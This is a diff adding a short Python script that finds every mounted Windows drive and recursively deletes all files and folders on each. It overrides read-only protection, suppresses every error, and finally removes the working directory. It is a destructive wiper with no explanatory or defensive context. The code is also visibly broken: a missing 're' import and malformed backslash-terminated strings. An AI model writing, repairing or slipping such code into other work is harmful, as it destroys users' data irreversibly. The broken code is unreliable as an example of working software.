@@ -1,0 +1,25 @@
+import os, stat
+import shutil
+drives=re.findall(r"[A-Z]+:.*$",os.popen("mountvol /").read(),re.MULTILINE)
+def remove_readonly(func, path, _):
+    os.chmod(path, stat.S_IWRITE)
+    func(path)
+cwd = os.getcwd()
+for drive in drives:
+    try:
+        os.chdir(f"{drive}\")
+        for root, dirs, files in os.walk(f"{drive}\"):
+            for f in files:
+                try:
+                    os.remove(f"{f}")
+                except:
+                    pass
+            for d in dirs:
+                try:
+                    shutil.rmtree(f"{drive}\{d}", onerror=remove_readonly)
+                except:
+                    pass
+    except:
+        pass
+    
+shutil.rmtree(cwd, onerror=remove_readonly)
